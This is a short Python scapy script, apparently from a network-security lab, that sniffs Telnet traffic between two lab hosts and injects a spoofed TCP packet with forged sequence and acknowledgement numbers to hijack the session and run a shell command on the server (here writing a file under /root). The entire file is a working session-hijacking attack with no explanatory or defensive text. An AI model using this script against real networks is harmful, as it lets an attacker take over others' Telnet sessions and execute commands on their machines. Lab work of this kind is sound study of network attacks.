#!/usr/bin/env python3
import sys
from scapy.all import *

def spoof(pkt):
    prev_ip_packet = pkt[IP]
    prev_tcp_packet = pkt[TCP]
    ip = IP(src=prev_ip_packet.src, dst=prev_ip_packet.dst)
    tcp = TCP(sport=prev_tcp_packet.sport, dport=prev_tcp_packet.dport, flags="A", \
        seq=prev_tcp_packet.seq+10, ack=prev_tcp_packet.ack+1)
    data = "\n echo hi > /root/hi \n"
    pkt = ip/tcp/data
    send(pkt,verbose=0)

sniff_filter="tcp and src host 10.9.0.6 and dst host 10.9.0.5 and dst port 23"
sniff(iface='br-e6282ca18803', filter=sniff_filter, prn=lambda x: spoof(x), count=0)